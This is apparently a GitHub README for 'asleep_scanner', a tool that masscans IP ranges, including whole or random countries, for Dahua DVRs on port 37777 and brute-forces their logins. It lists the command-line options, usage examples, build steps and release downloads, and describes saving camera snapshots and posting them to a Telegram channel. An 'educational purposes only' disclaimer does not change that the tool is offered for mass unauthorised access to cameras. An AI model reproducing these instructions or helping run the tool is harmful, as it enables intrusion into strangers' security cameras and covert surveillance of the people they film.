### Dahua DVRs bruteforcer at port 37777

Author of this code **is not responsible** of any illegal actions. \
For educational purposes only..

![Terminal record](https://github.com/d34db33f-1007/asleep_scanner/raw/master/tty.gif)


#### Usage:

1. get ur binary from [**releases**](https://github.com/d34db33f-1007/asleep_scanner/releases) page
   1.  `./asleep_xN --help`

```
Options:
  -h, --help            show this help message and exit
  -s SCAN_FILE          IP ranges list file to scan. Example:
                        192.168.1.1-192.168.11.1
  -b BRUTE_FILE         IPs list file to brute, in any format
  -m, --masscan         Run Masscan and brute it results
  --masscan-resume      Continue paused Masscan scan
  --no-snapshots        Do not make snapshots
  --no-xml              Do not make SMART PSS xml files
  -t THREADS            Threads number for Masscan. Default 3000
  --dead                Write not bruted cams to file
  -d                    Debug output
  --country             Scan by country
  --random-country      Scan by random country
  -l                    Brute combinations from logins.txt and passwords.txt
                        instead of combinations.txt
  -p PORTS, --ports=PORTS
                        Ports to scan, 37777 by default. Example: 37777,37778
                        
  `Example: [./asleep -b ips.txt] To brute hosts from list. 
            [./asleep -m -s ips.txt] To scan and brute hosts from list.
            [./asleep -m -s ips.txt -p 37777,37778,47777]
            [./asleep --random-country] To scan and brute random country
            [./asleep --country]
```
            

##### Interactive:

*  `git clone https://github.com/d34db33f-1007/asleep_scanner.git`
*  `pip3 install -r requirements.txt`
*  `python3 asleep.py --help`

##### View:

to view cams in live mode use [SmartPSS](https://dahuawiki.com/SmartPSS) for win and mac or [TaniDVR](http://tanidvr.sourceforge.net/) for Linux

#### Requirements:
besides content of **requirements.txt** this code needs [**masscan**](https://github.com/robertdavidgraham/masscan) and **Python 3.7 >** \
only for windows install [**WinPcap driver**](https://www.winpcap.org/)

#### Build:

1. get [normal](https://github.com/d34db33f-1007/asleep_scanner/releases/download/14.3b/build.tar.gz) or [light](https://github.com/d34db33f-1007/asleep_scanner/releases/download/14.3b/light_build.tar.gz) build version from [releases](https://github.com/d34db33f-1007/asleep_scanner/releases) page
2. `pip3 install -r requirements.txt`
3. run interactive for testing purposes
4. `pyinstaller --add-data '/path/to/python3.7/site-packages/pyfiglet:./pyfiglet' --add-data '/path/to/python3.7/site-packages/_geoip_geolite2:./_geoip_geolite2' --onefile asleep.py`

#### Configs:

all configs are well commented in .config file.

code can post snapshots to your telegram channel at the end of scanning.
add your Telegram Bot API Key and channel ID in .config file to make this work.
